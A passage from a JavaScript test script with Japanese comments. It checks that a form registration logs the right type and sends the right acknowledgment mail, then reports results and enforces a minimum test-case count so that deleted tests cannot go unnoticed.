      [ctx.Q_O1_PID]: "",
      [ctx.Q_O1_OS]: "Mac",
    })
  );
  const rows = logRows(ctx);
  const mail = ctx.__mails[0] || { subject: "", body: "" };
  push(
    "§20 O1 の提出は種別 register・O1 の件名・段 1 の URL を入れない",
    rows.length === 1 &&
      rows[0][1] === "register" &&
      mail.subject === ctx.o1RegisterAckSubject_() &&
      mail.body.indexOf(S1_URL) < 0,
    { rows, subject: mail.subject }
  );
}

let ng = 0;
cases.forEach((c) => {
  if (!c.ok) ng++;
  console.log(`${c.ok ? "OK  " : "NG  "} ${c.name} → ${JSON.stringify(c.got)}`);
});

// ⚠️ ★ 「NG が 0 件なら緑」だけだと、**ケースを 0 件にしても緑になる**。★ 下限を置く。
// ⚠️★ 下限は**実数に近づける**（code-reviewer 指摘・2026-08-28）。
//   ★ 45 のままだと実数 89 に対して**半分近く削っても緑**で、「削られていないか」を測れていない。
// ⚠️★ 実数に近づけて保つ（★ 2026-09-03: §13〜§16 を足して 221 件なので下限 215）。
//   ⚠️ 離れたままだと「テストが 13 件消えても気づかない」状態になる。
// 2026-10-08: §19 を足して 277 件、§6 に 5 件を足して 282 件なので下限 277。
// 2026-11-14: §20（段 1 の同意フォーム）を足した。下限は実数に合わせて直す。
if (cases.length < 348) {
  console.log(
    `\n${cases.length} 件しかケースが無い（348 未満）。テストが削られていないか確認すること。`
  );
  process.exit(1);
}

console.log(
  ng === 0
    ? `\n全 ${cases.length} ケース期待どおり`
    : `\n${ng} 件が期待と違う（全 ${cases.length} ケース）`
);
process.exit(ng === 0 ? 0 : 1);
